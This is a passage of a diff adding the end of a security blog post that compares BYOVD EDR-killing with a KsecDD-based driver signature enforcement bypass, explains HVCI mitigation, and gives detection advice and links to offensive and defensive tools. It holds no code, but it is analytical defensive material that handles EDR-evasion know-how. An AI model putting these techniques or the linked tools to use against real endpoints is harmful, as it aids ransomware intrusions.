+      <td>KsecDD.sys (built-in, Microsoft-signed)</td>
+    </tr>
+    <tr>
+      <td><strong>Unsigned code loaded</strong></td>
+      <td>Never</td>
+      <td>Enabled once g_cioptions = 0</td>
+    </tr>
+    <tr>
+      <td><strong>Immediate effect</strong></td>
+      <td>Target process killed</td>
+      <td>Any unsigned driver can now load</td>
+    </tr>
+    <tr>
+      <td><strong>Primary use case</strong></td>
+      <td>EDR termination before payload delivery</td>
+      <td>Custom kernel implant deployment</td>
+    </tr>
+    <tr>
+      <td><strong>EID 6 detection signal</strong></td>
+      <td>Third-party driver load, SHA-256 hashable</td>
+      <td>Absent: KsecDD already loaded at boot</td>
+    </tr>
+    <tr>
+      <td><strong>HVCI mitigation</strong></td>
+      <td>Blocked if carrier fails FORCE_INTEGRITY or W+X</td>
+      <td>Blocked: VTL1 maintains authoritative CI state; VTL0 write to g_cioptions has no effect</td>
+    </tr>
+    <tr>
+      <td><strong>Build specificity</strong></td>
+      <td>Low (IOCTL code stable across driver versions)</td>
+      <td>High (g_cioptions + gadget offset change per build)</td>
+    </tr>
+    <tr>
+      <td><strong>Operational cost</strong></td>
+      <td>Low (one-shot IOCTL, no patching)</td>
+      <td>High (offset maintenance, potential token impersonation)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>HVCI stops both paths, but through different mechanisms. BYOVD carriers that fail the <code class="language-plaintext highlighter-rouge">FORCE_INTEGRITY</code> or W+X structural checks are rejected before the kernel maps the image. DSE bypass via <code class="language-plaintext highlighter-rouge">g_cioptions</code> overwrite is stopped because HVCI externalises the enforcement state to VTL1: writes to the VTL0 kernel copy of <code class="language-plaintext highlighter-rouge">g_cioptions</code> have no effect because the hypervisor maintains its own authoritative enforcement record in secure memory that the VTL0 kernel cannot modify. This architectural separation is why HVCI is the single control that breaks both attack classes simultaneously.</p>
+
+<hr>
+
+<h2 id="byovd-in-ransomware-operations">BYOVD in Ransomware Operations</h2>
+
+<p>BYOVD sits squarely in Phase 4 (Defense Evasion) of the <a href="https://benjitrapp.github.io/cultures/2026-06-24-unified-ransomware-kill-chain/">Unified Ransomware Kill Chain</a>. Its role is to buy unobserved execution time:</p>
+
+<p><img src="https://benjitrapp.github.io/images/ransomware_deployment_chain.png" alt=""></p>
+
+<p>The dwell time between driver load and EDR termination is typically under 30 seconds. If your Sysmon pipeline has a 5-minute ingest delay, you will see the EID 6 alert after the EDR is already dead.</p>
+
+<blockquote>
+  <p><strong>The CSIRT lesson:</strong> Endpoint visibility is only as good as your ingest latency. Optimise your pipeline for sub-60-second ingest on Sysmon Event ID 6 with LOLDrivers hash matching at ingest.</p>
+</blockquote>
+
+<hr>
+
+<h2 id="references-and-open-source-research">References and Open-Source Research</h2>
+
+<p><strong>Primary research and tools:</strong></p>
+<ul>
+  <li><strong>Dsebler</strong>: <a href="https://github.com/lem0nSec/Dsebler">github.com/lem0nSec/Dsebler</a> — KExecDD reimplementation; KsecDD.sys as DSE disable gadget</li>
+  <li><strong>PhantomKiller</strong>: <a href="https://github.com/redteamfortress/PhantomKiller">github.com/redteamfortress/PhantomKiller</a></li>
+  <li><strong>NimBlackout</strong>: <a href="https://github.com/Helixo32/NimBlackout">github.com/Helixo32/NimBlackout</a></li>
+  <li><strong>DrvEye</strong>: <a href="https://github.com/0xDbgMan/DrvEye">github.com/0xDbgMan/DrvEye</a></li>
+  <li><strong>BYOVD Watchdog</strong>: <a href="https://github.com/pwnfuzz/byovd-watchdog">github.com/pwnfuzz/byovd-watchdog</a> · live at <a href="https://byovd-watchdog.pwnfuzz.com/">byovd-watchdog.pwnfuzz.com</a></li>
+  <li><strong>BYOVDFinder</strong>: <a href="https://github.com/ghostbyt3/BYOVDFinder">github.com/ghostbyt3/BYOVDFinder</a></li>
+  <li><strong>Trail of Bits HVCI LOLDrivers Check</strong>: <a href="https://github.com/trailofbits/HVCI-loldrivers-check">github.com/trailofbits/HVCI-loldrivers-check</a></li>
+  <li><strong>ADHDMurky: BYOVD for Dummies</strong>: <a href="https://adhdmurky.github.io/posts/post3/">adhdmurky.github.io/posts/post3</a></li>
+  <li><strong>Blackout (original)</strong>: <a href="https://github.com/ZeroMemoryEx/Blackout">github.com/ZeroMemoryEx/Blackout</a></li>
+</ul>
+
+<p><strong>Community resources:</strong></p>
+<ul>
+  <li><strong>LOLDrivers</strong>: <a href="https://www.loldrivers.io/">loldrivers.io</a> · <a href="https://www.loldrivers.io/#detections">SIEM detections</a></li>
+  <li><strong>Microsoft WDAC Block List</strong>: <a href="https://aka.ms/VulnerableDriverBlockList">aka.ms/VulnerableDriverBlockList</a></li>
+  <li><strong>MITRE ATT&amp;CK:</strong> <a href="https://attack.mitre.org/techniques/T1068/">T1068</a> · <a href="https://attack.mitre.org/techniques/T1562/001/">T1562.001</a> · <a href="https://attack.mitre.org/techniques/T1543/003/">T1543.003</a> · <a href="https://attack.mitre.org/techniques/T1014/">T1014</a></li>
+</ul>
+
+<p><strong>Related posts on this blog:</strong></p>
+<ul>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/">EDR Bypass Roadmap</a></li>
+  <li><a href="https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/">ETW-TI Deep Dive</a></li>
+  <li><a href="https://benjitrapp.github.io/attacks/2026-05-17-threadless-injection-process-ghosting/">Breaking the Thread &amp; Spawning Ghosts</a></li>
+  <li><a href="https://benjitrapp.github.io/cultures/2026-06-24-unified-ransomware-kill-chain/">Unified Ransomware Kill Chain</a></li>
+</ul>
+
+
+  </div>
+
+  <div class="date">
+    Written on June 24, 2026
+  </div>
+  <br>
+  <br>
+  <a href="https://benjitrapp.github.io/attack">◀ Back to attack related posts</a>
+</article>
+
+    </div>
+
+    <div class="wrapper-footer scroll-reveal">
+      <div class="container">
+        
+      </div>
+    </div>
+
+    
+	<!-- Google Analytics -->
+	
+	<!-- End Google Analytics -->
+
+
+    
+    
+    
+
+    <!-- Mermaid: only pulled in when a diagram is present on the page -->
+    
+  
+
+</body></html>
